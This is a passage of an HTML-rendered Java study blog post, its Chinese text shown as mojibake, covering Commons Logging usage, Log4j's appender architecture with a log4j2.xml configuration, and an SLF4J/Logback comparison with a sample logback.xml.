&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è·å–å®ä¾‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æ‰“å°æ—¥å¿—
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">warn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;end.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>6ä¸ªæ—¥å¿—çº§åˆ«&lt;/li>
&lt;/ul>
&lt;p>FATAL, ERROR, WARNING, INFO(default), DEBUG, TRACE&lt;/p>
&lt;ul>
&lt;li>é™¤&lt;code>info(String)&lt;/code>å¤–è¿˜æœ‰&lt;code>info(String, Throwable)&lt;/code>è¿™æ ·ä¸€ä¸ªé‡è½½æ–¹æ³•ï¼Œä¾¿äºæ›´ç®€å•åœ°è®°å½•å¼‚å¸¸&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;got exception!&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¦‚æœåœ¨é™æ€æ–¹æ³•ä¸­å¼•ç”¨&lt;code>Log&lt;/code>ï¼Œé€šå¸¸ç›´æ¥å®šä¹‰ä¸€ä¸ªé™æ€ç±»å‹å˜é‡ï¼š&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åœ¨é™æ€æ–¹æ³•ä¸­å¼•ç”¨Log:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åœ¨å®ä¾‹æ–¹æ³•ä¸­å¼•ç”¨&lt;code>Log&lt;/code>ï¼Œé€šå¸¸å®šä¹‰ä¸€ä¸ªå®ä¾‹å˜é‡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// åœ¨å®ä¾‹æ–¹æ³•ä¸­å¼•ç”¨Log:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä¸Šé¢å±•ç¤ºäº†ä¸¤ç§&lt;code>getLog()&lt;/code>çš„æ–¹å¼ï¼Œç¬¬äºŒç§çš„å¥½å¤„æ˜¯å­ç±»å¯ä»¥ç›´æ¥ä½¿ç”¨è¯¥å®ä¾‹ï¼ŒåŸå› æ˜¯Javaçš„åŠ¨æ€ç‰¹æ€§ï¼Œå­ç±»è·å–çš„&lt;code>Log&lt;/code>å­—æ®µå®é™…ä¸Šç›¸å½“äº&lt;code>LogFactory.getLog(Student.class)&lt;/code>ï¼Œä½†å´æ˜¯ä»çˆ¶ç±»ç»§æ‰¿è€Œæ¥ï¼Œå¹¶ä¸”æ— éœ€æ”¹åŠ¨ä»£ç &lt;/li>
&lt;/ul>
&lt;h3 id="log4j">Log4j&lt;/h3>
&lt;p>æ—¥å¿—å®ç°ï¼ˆä¹ï¼‰Log4jï¼Œæˆ‘çœŸçš„å¥½å–œæ¬¢ä½ å•Šï¼ä¸ºäº†ä½ ï¼Œæˆ‘ä¸è¦ç”¨æ— åºåˆ—è¡¨äº†ï¼ï¼ï¼&lt;/p>
&lt;p>Log4jæ˜¯ä¸€ä¸ªç»„ä»¶åŒ–è®¾è®¡çš„æ—¥å¿—ç³»ç»Ÿï¼Œå®ƒçš„æ¶æ„å¤§è‡´å¦‚ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227012115179.png" alt="image-20220227012115179">&lt;/p>
&lt;p>å½“æˆ‘ä»¬ä½¿ç”¨Log4jè¾“å‡ºä¸€æ¡æ—¥å¿—æ—¶ï¼ŒLog4jè‡ªåŠ¨é€šè¿‡ä¸åŒçš„AppenderæŠŠåŒä¸€æ¡æ—¥å¿—è¾“å‡ºåˆ°ä¸åŒçš„ç›®çš„åœ°&lt;/p>
&lt;ul>
&lt;li>consoleï¼šè¾“å‡ºåˆ°å±å¹•ï¼›&lt;/li>
&lt;li>fileï¼šè¾“å‡ºåˆ°æ–‡ä»¶ï¼›&lt;/li>
&lt;li>socketï¼šé€šè¿‡ç½‘ç»œè¾“å‡ºåˆ°è¿œç¨‹è®¡ç®—æœºï¼›&lt;/li>
&lt;li>jdbcï¼šè¾“å‡ºåˆ°æ•°æ®åº“&lt;/li>
&lt;/ul>
&lt;p>é€šè¿‡Filteræ¥è¿‡æ»¤å“ªäº›logéœ€è¦è¢«è¾“å‡ºï¼Œæœ€åï¼Œé€šè¿‡Layoutæ¥æ ¼å¼åŒ–æ—¥å¿—ä¿¡æ¯&lt;/p>
&lt;p>ä½¿ç”¨Log4jæ—¶åªéœ€æŠŠä¸€ä¸ª&lt;code>log4j2.xml&lt;/code>çš„æ–‡ä»¶æ”¾åˆ°&lt;code>classpath&lt;/code>ä¸‹å°±å¯ä»¥è®©Log4jè¯»å–é…ç½®æ–‡ä»¶å¹¶æŒ‰ç…§æˆ‘ä»¬çš„é…ç½®æ¥è¾“å‡ºæ—¥å¿—&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;Configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Properties&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å®šä¹‰æ—¥å¿—æ ¼å¼ --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;log.pattern&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>%d{MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36}%n%msg%n%n&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å®šä¹‰æ–‡ä»¶åå˜é‡ --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file.err.filename&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>log/err.log&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file.err.pattern&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>log/err.%i.log.gz&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Properties&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å®šä¹‰Appenderï¼Œå³ç›®çš„åœ° --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Appenders&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å®šä¹‰è¾“å‡ºåˆ°å±å¹• --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Console&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;console&amp;#34;&lt;/span> &lt;span style="color:#75af00">target=&lt;/span>&lt;span style="color:#d88200">&amp;#34;SYSTEM_OUT&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- æ—¥å¿—æ ¼å¼å¼•ç”¨ä¸Šé¢å®šä¹‰çš„log.pattern --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;PatternLayout&lt;/span> &lt;span style="color:#75af00">pattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${log.pattern}&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Console&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å®šä¹‰è¾“å‡ºåˆ°æ–‡ä»¶,æ–‡ä»¶åå¼•ç”¨ä¸Šé¢å®šä¹‰çš„file.err.filename --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;RollingFile&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;err&amp;#34;&lt;/span> &lt;span style="color:#75af00">bufferedIO=&lt;/span>&lt;span style="color:#d88200">&amp;#34;true&amp;#34;&lt;/span> &lt;span style="color:#75af00">fileName=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${file.err.filename}&amp;#34;&lt;/span> &lt;span style="color:#75af00">filePattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${file.err.pattern}&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;PatternLayout&lt;/span> &lt;span style="color:#75af00">pattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${log.pattern}&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Policies&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- æ ¹æ®æ–‡ä»¶å¤§å°è‡ªåŠ¨åˆ‡å‰²æ—¥å¿— --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;SizeBasedTriggeringPolicy&lt;/span> &lt;span style="color:#75af00">size=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1 MB&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Policies&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- ä¿ç•™æœ€è¿‘10ä»½ --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;DefaultRolloverStrategy&lt;/span> &lt;span style="color:#75af00">max=&lt;/span>&lt;span style="color:#d88200">&amp;#34;10&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/RollingFile&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Appenders&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Loggers&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Root&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å¯¹infoçº§åˆ«çš„æ—¥å¿—ï¼Œè¾“å‡ºåˆ°console --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;AppenderRef&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;console&amp;#34;&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å¯¹errorçº§åˆ«çš„æ—¥å¿—ï¼Œè¾“å‡ºåˆ°errï¼Œå³ä¸Šé¢å®šä¹‰çš„RollingFile --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;AppenderRef&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;err&amp;#34;&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Root&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Loggers&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/Configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="slf4jlogback">SLF4J&amp;amp;Logback&lt;/h3>
&lt;p>ç±»ä¼¼ä¸Šé¢é‚£ä¸€å¯¹ï¼Œåšäº†äº›è®¸æ”¹è¿›&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">Commons Logging&lt;/th>
&lt;th style="text-align:left">SLF4J&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">org.apache.commons.logging.Log&lt;/td>
&lt;td style="text-align:left">org.slf4j.Logger&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">org.apache.commons.logging.LogFactory&lt;/td>
&lt;td style="text-align:left">org.slf4j.LoggerFactory&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>ä»ä½¿ç”¨xml&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;CONSOLE&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.ConsoleAppender&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;pattern&amp;gt;&lt;/span>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n&lt;span style="color:#f92672">&amp;lt;/pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/appender&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;FILE&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.RollingFileAppender&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;pattern&amp;gt;&lt;/span>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n&lt;span style="color:#f92672">&amp;lt;/pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;charset&amp;gt;&lt;/span>utf-8&lt;span style="color:#f92672">&amp;lt;/charset&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;file&amp;gt;&lt;/span>log/output.log&lt;span style="color:#f92672">&amp;lt;/file&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;rollingPolicy&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.FixedWindowRollingPolicy&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;fileNamePattern&amp;gt;&lt;/span>log/output.log.%i&lt;span style="color:#f92672">&amp;lt;/fileNamePattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/rollingPolicy&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;triggeringPolicy&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;MaxFileSize&amp;gt;&lt;/span>1MB&lt;span style="color:#f92672">&amp;lt;/MaxFileSize&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/triggeringPolicy&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/appender&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;root&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;INFO&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender-ref&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;CONSOLE&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender-ref&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;FILE&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/root&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;p>å­¦å®ŒåŸºç¡€è¯­æ³•çš„æ„Ÿè§‰æ˜¯çº¦ç­‰äºåŒæ—¶å¤å»ºäº†PHP+c+Python+NodeJSï¼Œè™½è¯´æ˜¯é€Ÿé€šï¼Œä½†æ˜¯æ„Ÿè§‰è§¦ç±»æ—é€šï¼Œå¾ˆå¤šä¸œè¥¿éƒ½æ˜ç™½äº†ï¼ˆå¤§æ¦‚ï¼‰&lt;/p>
